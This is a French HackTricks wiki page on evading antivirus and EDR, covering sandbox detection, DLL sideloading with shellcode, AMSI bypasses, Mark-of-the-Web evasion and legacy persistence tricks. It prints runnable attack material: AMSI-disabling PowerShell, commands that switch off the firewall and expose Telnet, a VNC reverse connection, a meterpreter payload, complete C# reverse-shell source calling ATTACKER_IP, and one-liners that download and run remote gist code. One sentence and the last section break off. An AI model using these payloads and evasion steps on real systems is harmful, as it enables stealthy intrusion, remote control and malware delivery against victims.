# Contournement de l'antivirus (AV)

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

- Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
- Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
- **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
- **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

**Cette page a été rédigée par** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Méthodologie d'évasion de l'AV**

Actuellement, les AV utilisent différentes méthodes pour vérifier si un fichier est malveillant ou non, la détection statique, l'analyse dynamique et, pour les EDR plus avancés, l'analyse comportementale.

### **Détection statique**

La détection statique est réalisée en signalant des chaînes malveillantes connues ou des tableaux d'octets dans un binaire ou un script, et en extrayant également des informations du fichier lui-même (par exemple, description du fichier, nom de l'entreprise, signatures numériques, icône, somme de contrôle, etc.). Cela signifie que l'utilisation d'outils publics connus peut vous faire repérer plus facilement, car ils ont probablement été analysés et signalés comme malveillants. Il existe quelques façons de contourner ce type de détection :

- **Chiffrement**

Si vous chiffrez le binaire, l'AV ne pourra pas détecter votre programme, mais vous aurez besoin d'un type de chargeur pour décrypter et exécuter le programme en mémoire.

- **Obfuscation**

Parfois, il suffit de modifier quelques chaînes dans votre binaire ou script pour le faire passer devant l'AV, mais cela peut être une tâche chronophage en fonction de ce que vous essayez d'obfusquer.

- **Outils personnalisés**

Si vous développez vos propres outils, il n'y aura pas de signatures malveillantes connues, mais cela prend beaucoup de temps et d'efforts.

{% hint style="info" %}
Une bonne façon de vérifier la détection statique de Windows Defender est [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Il divise essentiellement le fichier en plusieurs segments, puis demande à Defender de scanner chacun individuellement, de cette manière, il peut vous dire exactement quelles sont les chaînes ou octets signalés dans votre binaire.
{% endhint %}

Je vous recommande vivement de consulter cette [playlist YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) sur l'évasion pratique de l'AV.

### **Analyse dynamique**

L'analyse dynamique consiste à exécuter votre binaire dans un bac à sable et à surveiller les activités malveillantes (par exemple, tenter de décrypter et lire les mots de passe de votre navigateur, effectuer un minidump sur LSASS, etc.). Cette partie peut être un peu plus délicate à manipuler, mais voici quelques choses que vous pouvez faire pour éviter les bac à sable.

- **Pause avant l'exécution** Selon la manière dont elle est implémentée, cela peut être un excellent moyen de contourner l'analyse dynamique de l'AV. Les AV ont très peu de temps pour analyser les fichiers afin de ne pas interrompre le flux de travail de l'utilisateur, donc l'utilisation de longues pauses peut perturber l'analyse des binaires. Le problème est que de nombreux bac à sable AV peuvent simplement sauter la pause en fonction de la manière dont elle est implémentée.
- **Vérification des ressources de la machine** Les bac à sable ont généralement très peu de ressources à leur disposition (par exemple, < 2 Go de RAM), sinon ils pourraient ralentir la machine de l'utilisateur. Vous pouvez également être très créatif ici, par exemple en vérifiant la température du CPU ou même les vitesses des ventilateurs, tout ne sera pas implémenté dans le bac à sable.
- **Vérifications spécifiques à la machine** Si vous souhaitez cibler un utilisateur dont le poste de travail est joint au domaine "contoso.local", vous pouvez vérifier le domaine de l'ordinateur pour voir s'il correspond à celui que vous avez spécifié, s'il ne correspond pas, vous pouvez faire sortir votre programme.

Il s'avère que l'ordinateur Sandbox de Microsoft Defender s'appelle HAL9TH, donc, vous pouvez vérifier le nom de l'ordinateur dans votre logiciel malveillant avant la détonation, si le nom correspond à HAL9TH, cela signifie que vous êtes à l'intérieur du bac à sable de Defender, vous pouvez donc faire sortir votre programme.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Quelques autres conseils vraiment utiles de [@mgeeky](https://twitter.com/mariuszbit) pour lutter contre les bac à sable

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Comme nous l'avons dit précédemment dans ce post, les **outils publics** seront éventuellement **détectés**, donc, vous devriez vous poser une question :

Par exemple, si vous voulez extraire LSASS, **avez-vous vraiment besoin d'utiliser mimikatz** ? Ou pourriez-vous utiliser un autre projet moins connu qui extrait également LSASS.

La bonne réponse est probablement la seconde option. En prenant mimikatz comme exemple, c'est probablement l'un, sinon le logiciel le plus signalé par les AV et les EDR, alors que le projet lui-même est super cool, il est aussi un cauchemar pour travailler avec pour contourner les AV, donc cherchez simplement des alternatives pour ce que vous essayez d'accomplir.

{% hint style="info" %}
Lorsque vous modifiez vos charges utiles pour l'évasion, assurez-vous de **désactiver la soumission automatique des échantillons** dans Defender, et s'il vous plaît, sérieusement, **NE PAS SOUMETTRE À VIRUSTOTAL** si votre objectif est d'éviter la détection à long terme. Si vous voulez vérifier si votre charge utile est détectée par un AV particulier, installez-le sur une VM, essayez de désactiver la soumission automatique des échantillons, et testez-le là-bas jusqu'à ce que vous soyez satisfait du résultat.
{% endhint %}

## EXE vs DLL

Chaque fois que c'est possible, **priorisez l'utilisation de DLL pour l'évasion**, dans mon expérience, les fichiers DLL sont généralement **beaucoup moins détectés** et analysés, donc c'est un truc très simple à utiliser pour éviter la détection dans certains cas (si votre charge utile a un moyen de s'exécuter en tant que DLL bien sûr).

Comme nous pouvons le voir dans cette image, une charge utile DLL de Havoc a un taux de détection de 4/26 dans antiscan.me, tandis que la charge utile EXE a un taux de détection de 7/26.

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>Comparaison de antiscan.me d'une charge utile EXE normale de Havoc par rapport à une charge utile DLL normale de Havoc</p></figcaption></figure>

Maintenant, nous allons montrer quelques astuces que vous pouvez utiliser avec des fichiers DLL pour être beaucoup plus furtif.

## Chargement latéral et proxying de DLL

Le **chargement latéral de DLL** profite de l'ordre de recherche de DLL utilisé par le chargeur en positionnant à la fois l'application victime et les charges utiles malveillantes côte à côte.

Vous pouvez vérifier les programmes susceptibles de chargement latéral de DLL en utilisant [Siofra](https://github.com/Cybereason/siofra) et le script PowerShell suivant :

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Cette commande affichera la liste des programmes susceptibles de subir une attaque de détournement de DLL à l'intérieur de "C:\Program Files\\" et les fichiers DLL qu'ils essaient de charger.

Je vous recommande vivement d'**explorer vous-même les programmes vulnérables au détournement de DLL**, cette technique est assez furtive si elle est bien réalisée, mais si vous utilisez des programmes DLL Sideloadable connus du public, vous pourriez être facilement repéré.

Simplement en plaçant une DLL malveillante avec le nom qu'un programme s'attend à charger, votre charge utile ne sera pas chargée, car le programme s'attend à certaines fonctions spécifiques à l'intérieur de cette DLL. Pour résoudre ce problème, nous utiliserons une autre technique appelée **DLL Proxying/Forwarding**.

Le **DLL Proxying** redirige les appels qu'un programme effectue depuis la DLL proxy (malveillante) vers la DLL d'origine, préservant ainsi la fonctionnalité du programme et permettant de gérer l'exécution de votre charge utile.

Je vais utiliser le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Voici les étapes que j'ai suivies:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

La dernière commande nous donnera 2 fichiers : un modèle de code source DLL et le DLL renommé d'origine.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Voici les résultats :

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Notre shellcode (encodé avec [SGN](https://github.com/EgeBalci/sgn)) et le proxy DLL ont tous les deux un taux de détection de 0/26 sur [antiscan.me](https://antiscan.me) ! Je qualifierais cela de succès.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Je **recommande vivement** de regarder la VOD de [twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sur le DLL Sideloading et aussi la vidéo de [ippsec](https://www.youtube.com/watch?v=3eROsG\_WNpE) pour en apprendre davantage sur ce que nous avons discuté en détail.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze est une trousse à outils de charge utile pour contourner les EDR en utilisant des processus suspendus, des appels système directs et des méthodes d'exécution alternatives`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
L'évasion est juste un jeu du chat et de la souris, ce qui fonctionne aujourd'hui pourrait être détecté demain, donc ne vous fiez jamais à un seul outil, si possible, essayez de chaîner plusieurs techniques d'évasion.
{% endhint %}

## AMSI (Interface de Scan Anti-Malware)

AMSI a été créé pour prévenir les "[malwares sans fichier](https://en.wikipedia.org/wiki/Fileless\_malware)". Initialement, les AV étaient capables de scanner uniquement les **fichiers sur le disque**, donc si vous pouviez exécuter des charges utiles **directement en mémoire**, l'AV ne pouvait rien faire pour l'empêcher, car il n'avait pas assez de visibilité.

La fonctionnalité AMSI est intégrée à ces composants de Windows.

* Contrôle de compte d'utilisateur, ou UAC (élévation de l'installation EXE, COM, MSI ou ActiveX)
* PowerShell (scripts, utilisation interactive et évaluation de code dynamique)
* Windows Script Host (wscript.exe et cscript.exe)
* JavaScript et VBScript
* Macros Office VBA

Il permet aux solutions antivirus d'inspecter le comportement des scripts en exposant le contenu du script sous une forme à la fois non cryptée et non obscurcie.

L'exécution de `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produira l'alerte suivante sur Windows Defender.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Remarquez comment il ajoute `amsi:` puis le chemin de l'exécutable à partir duquel le script s'est exécuté, dans ce cas, powershell.exe

Nous n'avons pas déposé de fichier sur le disque, mais avons quand même été attrapés en mémoire à cause d'AMSI.

Il existe quelques façons de contourner AMSI :

* **Obfuscation**

Puisque AMSI fonctionne principalement avec des détections statiques, modifier les scripts que vous essayez de charger peut être une bonne façon d'éviter la détection.

Cependant, AMSI a la capacité de désobfusquer les scripts même s'ils ont plusieurs couches, donc l'obfuscation pourrait être une mauvaise option en fonction de la manière dont elle est réalisée. Cela le rend non si simple à éviter. Cependant, parfois, il suffit de changer quelques noms de variables et vous serez bons, donc cela dépend de combien quelque chose a été signalé.

* **Contournement d'AMSI**

Puisque AMSI est implémenté en chargeant une DLL dans le processus powershell (également cscript.exe, wscript.exe, etc.), il est possible de le manipuler facilement même en tant qu'utilisateur non privilégié. En raison de cette faille dans l'implémentation d'AMSI, les chercheurs ont trouvé plusieurs façons d'éviter l'analyse AMSI.

**Forcer une Erreur**

Forcer l'échec de l'initialisation d'AMSI (amsiInitFailed) fera en sorte qu'aucune analyse ne soit lancée pour le processus en cours. À l'origine, cela a été divulgué par [Matt Graeber](https://twitter.com/mattifestation) et Microsoft a développé une signature pour empêcher une utilisation plus large.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Tout ce qu'il a fallu, c'était une ligne de code powershell pour rendre AMSI inutilisable pour le processus powershell actuel. Cette ligne a bien sûr été repérée par AMSI lui-même, donc certaines modifications sont nécessaires pour utiliser cette technique.

Voici une technique de contournement AMSI modifiée que j'ai trouvée dans ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Patch de mémoire**

Cette technique a été initialement découverte par [@RastaMouse](https://twitter.com/\_RastaMouse/) et consiste à trouver l'adresse de la fonction "AmsiScanBuffer" dans amsi.dll (responsable de l'analyse de l'entrée fournie par l'utilisateur) et à la remplacer par des instructions renvoyant le code pour E\_INVALIDARG, de cette manière, le résultat de l'analyse réelle renverra 0, ce qui est interprété comme un résultat propre.

{% hint style="info" %}
Veuillez lire [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.
{% endhint %}

Il existe également de nombreuses autres techniques utilisées pour contourner AMSI avec PowerShell, consultez [**cette page**](basic-powershell-for-pentesters/#amsi-bypass) et [ce dépôt](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) pour en savoir plus à leur sujet.

Ou ce script qui, via un patch de mémoire, patchera chaque nouveau Powersh

## Obfuscation

Il existe plusieurs outils qui peuvent être utilisés pour **obfusquer le code en clair C#**, générer des **modèles de méta-programmation** pour compiler des binaires ou **obfusquer des binaires compilés** tels que :

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Obfuscateur C#**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator) : Le but de ce projet est de fournir une version open-source d'une fourche de la suite de compilation [LLVM](http://www.llvm.org/) capable de fournir une sécurité logicielle accrue grâce à l'[obfuscation de code](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) et à la protection contre la falsification.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator) : ADVobfuscator montre comment utiliser le langage `C++11/14` pour générer, au moment de la compilation, du code obfusqué sans utiliser d'outil externe et sans modifier le compilateur.
* [**obfy**](https://github.com/fritzone/obfy) : Ajoutez une couche d'opérations obfusquées générées par le framework de méta-programmation en modèle C++ qui compliquera un peu la tâche de la personne voulant craquer l'application.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz est un obfuscateur binaire x64 capable d'obfusquer différents fichiers PE, y compris : .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame) : Metame est un moteur de code métamorphique simple pour des exécutables arbitraires.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator) : ROPfuscator est un cadre d'obfuscation de code à grain fin pour les langages pris en charge par LLVM utilisant ROP (programmation orientée retour). ROPfuscator obfusque un programme au niveau du code d'assemblage en transformant les instructions régulières en chaînes ROP, contrecarrant notre conception naturelle du flux de contrôle normal.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt) : Nimcrypt est un crypteur .NET PE écrit en Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor est capable de convertir les fichiers EXE/DLL existants en code shellcode, puis de les charger

## SmartScreen & MoTW

Vous avez peut-être vu cet écran lors du téléchargement de certains exécutables depuis Internet et de leur exécution.

Microsoft Defender SmartScreen est un mécanisme de sécurité destiné à protéger l'utilisateur final contre l'exécution d'applications potentiellement malveillantes.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen fonctionne principalement avec une approche basée sur la réputation, ce qui signifie que les applications rarement téléchargées déclencheront SmartScreen, alertant ainsi et empêchant l'utilisateur final d'exécuter le fichier (bien que le fichier puisse toujours être exécuté en cliquant sur Plus d'informations -> Exécuter quand même).

**MoTW** (Mark of The Web) est un [flux de données alternatif NTFS](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) portant le nom de Zone.Identifier qui est automatiquement créé lors du téléchargement de fichiers depuis Internet, avec l'URL à partir de laquelle il a été téléchargé.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>Vérification du flux de données alternatif Zone.Identifier pour un fichier téléchargé depuis Internet.</p></figcaption></figure>

{% hint style="info" %}
Il est important de noter que les exécutables signés avec un certificat de signature **de confiance** ne déclencheront pas SmartScreen.
{% endhint %}

Une façon très efficace d'empêcher vos charges utiles d'obtenir le Mark of The Web est de les empaqueter dans un certain type de conteneur comme une ISO. Cela se produit car le Mark-of-the-Web (MOTW) **ne peut pas** être appliqué aux volumes **non NTFS**.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui emballe les charges utiles dans des conteneurs de sortie pour éviter le Mark-of-the-Web.

Exemple d'utilisation:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Voici une démo pour contourner SmartScreen en empaquetant des charges utiles à l'intérieur de fichiers ISO en utilisant [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Réflexion sur l'assemblage C#

Le chargement des binaires C# en mémoire est connu depuis un certain temps et reste un excellent moyen d'exécuter vos outils de post-exploitation sans être détecté par l'AV.

Étant donné que la charge utile sera chargée directement en mémoire sans toucher au disque, nous n'aurons qu'à nous soucier du patch AMSI pour l'ensemble du processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) offrent déjà la possibilité d'exécuter des assemblages C# directement en mémoire, mais il existe différentes façons de le faire :

* **Fork\&Run**

Cela implique **de lancer un nouveau processus sacrificiel**, d'injecter votre code malveillant de post-exploitation dans ce nouveau processus, d'exécuter votre code malveillant et, une fois terminé, de tuer le nouveau processus. Cette méthode présente à la fois des avantages et des inconvénients. L'avantage de la méthode fork and run est que l'exécution se produit **en dehors** de notre processus d'implant Beacon. Cela signifie que si quelque chose se passe mal ou est détecté lors de notre action de post-exploitation, il y a **beaucoup plus de chances** que notre **implant survive**. L'inconvénient est que vous avez **plus de chances** d'être détecté par des **détections comportementales**.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Il s'agit d'injecter le code malveillant de post-exploitation **dans son propre processus**. De cette manière, vous pouvez éviter de devoir créer un nouveau processus et le faire analyser par l'AV, mais l'inconvénient est que si quelque chose se passe mal avec l'exécution de votre charge utile, il y a **beaucoup plus de chances** de **perdre votre beacon** car il pourrait planter.

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Si vous souhaitez en savoir plus sur le chargement des assemblages C#, veuillez consulter cet article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) et leur BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Vous pouvez également charger des assemblages C# **depuis PowerShell**, consultez [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) et la [vidéo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Utilisation d'autres langages de programmation

Comme proposé dans [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), il est possible d'exécuter du code malveillant en utilisant d'autres langages en donnant à la machine compromise l'accès **à l'environnement d'interprétation installé sur le partage SMB contrôlé par l'attaquant**.&#x20;

En permettant l'accès aux binaires d'interprétation et à l'environnement sur le partage SMB, vous pouvez **exécuter du code arbitraire dans ces langages en mémoire** de la machine compromise.

Le dépôt indique : Defender scanne toujours les scripts mais en utilisant Go, Java, PHP, etc., nous avons **plus de flexibilité pour contourner les signatures statiques**. Les tests avec des scripts de shell inversé aléatoires non obfusqués dans ces langages ont été concluants.

## Évasion avancée

L'évasion est un sujet très complexe, parfois vous devez tenir compte de nombreuses sources de télémétrie dans un seul système, il est donc pratiquement impossible de rester complètement indétecté dans des environnements matures.

Chaque environnement que vous affrontez aura ses propres forces et faiblesses.

Je vous encourage vivement à regarder cette présentation de [@ATTL4S](https://twitter.com/DaniLJ94), pour avoir un aperçu des techniques d'évasion avancées.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Voici également une autre excellente présentation de [@mariuszbit](https://twitter.com/mariuszbit) sur l'évasion en profondeur.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Anciennes techniques**

### **Vérifier quelles parties Defender considère comme malveillantes**

Vous pouvez utiliser [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) qui **supprimera des parties du binaire** jusqu'à ce qu'il **découvre quelle partie Defender** considère comme malveillante et vous la divise.\
Un autre outil faisant la **même chose est** [**avred**](https://github.com/dobin/avred) avec une offre web ouverte du service sur [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serveur Telnet**

Jusqu'à Windows10, tous les Windows étaient livrés avec un **serveur Telnet** que vous pouviez installer (en tant qu'administrateur) en faisant :
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faites-le **démarrer** lorsque le système est démarré et **exécutez**-le maintenant:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Changer le port telnet** (stealth) et désactiver le pare-feu :
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Téléchargez-le depuis: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vous voulez les téléchargements binaires, pas l'installation)

**SUR L'HÔTE**: Exécutez _**winvnc.exe**_ et configurez le serveur:

* Activez l'option _Désactiver TrayIcon_
* Définissez un mot de passe dans _VNC Password_
* Définissez un mot de passe dans _View-Only Password_

Ensuite, déplacez le binaire _**winvnc.exe**_ et le fichier nouvellement créé _**UltraVNC.ini**_ à l'intérieur de la **victime**

#### **Connexion inversée**

L'**attaquant** doit **exécuter à l'intérieur** de son **hôte** le binaire `vncviewer.exe -listen 5900` afin qu'il soit **prêt** à capturer une connexion **VNC inversée**. Ensuite, à l'intérieur de la **victime**: Démarrez le démon winvnc `winvnc.exe -run` et exécutez `winwnc.exe [-autoreconnect] -connect <adresse_ip_attaquant>::5900`

**ATTENTION:** Pour maintenir la discrétion, vous ne devez pas faire quelques choses

* Ne démarrez pas `winvnc` s'il est déjà en cours d'exécution ou vous déclencherez une [fenêtre contextuelle](https://i.imgur.com/1SROTTl.png). vérifiez s'il est en cours d'exécution avec `tasklist | findstr winvnc`
* Ne démarrez pas `winvnc` sans `UltraVNC.ini` dans le même répertoire ou cela provoquera l'ouverture de [la fenêtre de configuration](https://i.imgur.com/rfMQWcf.png)
* Ne lancez pas `winvnc -h` pour obtenir de l'aide ou vous déclencherez une [fenêtre contextuelle](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Téléchargez-le depuis: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
À l'intérieur de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Maintenant **démarrez le lister** avec `msfconsole -r file.rc` et **exécutez** le **payload xml** avec:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**L'antivirus actuel va terminer le processus très rapidement.**

### Compilation de notre propre shell inversé

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Premier shell inversé en C#

Compilez-le avec :
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Utilisez-le avec :
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# en utilisant le compilateur
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Téléchargement et exécution automatiques :
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
